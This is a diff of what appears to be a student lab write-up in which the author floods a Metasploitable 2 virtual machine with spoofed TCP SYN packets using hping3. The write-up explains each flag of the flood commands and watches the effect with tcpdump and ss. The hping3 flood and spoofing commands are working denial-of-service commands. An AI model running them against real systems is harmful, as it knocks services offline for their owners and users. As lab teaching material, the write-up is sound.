@@ -20,16 +20,21 @@ We analyze the capture (web.pcap) using Wireshark, sorted the HTTP protocol and 
 
 Using Kali, router and ms2 virtual machines I launched a TCP SYN Flood Dos attack on metasploitable 2 (ms2 - 172.16.1.35).
 Using the commands Terminal1:
-• sudo hping3 --syn -p 80 --spoof 172.16.1.1 --flood ms2
-• sudo hping3 --syn --data 120 -p 80 --flood ms2
+
+<li> sudo hping3 --syn -p 80 --spoof 172.16.1.1 --flood ms2</li>
+<li> sudo hping3 --syn --data 120 -p 80 --flood ms2</li>
+</br>
 What it does:
-• --syn → sends SYN packets
-• -p 80 → target port (HTTP)
-• --spoof 172.16.1.1 → fake sender (router)
-• --flood → send packets as fast as possible
-• --data 120 → adds payload (sample 120) - heavier attack
-Commands in Terminal 2 to detect SYN packets.
-• sudo tcpdump -i eth1
+<li>  --syn → sends SYN packets</li>
+<li>  -p 80 → target port (HTTP)</li>
+<li>  --spoof 172.16.1.1 → fake sender (router)</li>
+<li>  --flood → send packets as fast as possible</li>
+<li>  --data 120 → adds payload (sample 120) - heavier attack</li>
+
+<b>Commands in Terminal 2 to detect SYN packets.<b>
+
+<li>  sudo tcpdump -i eth1
 
 On the other end, used the following command in ms2 to see the output of the attack.
-• Ms2$sleep 5 ; ss -a |grep :www
+
+<li>  Ms2$sleep 5 ; ss -a |grep :www
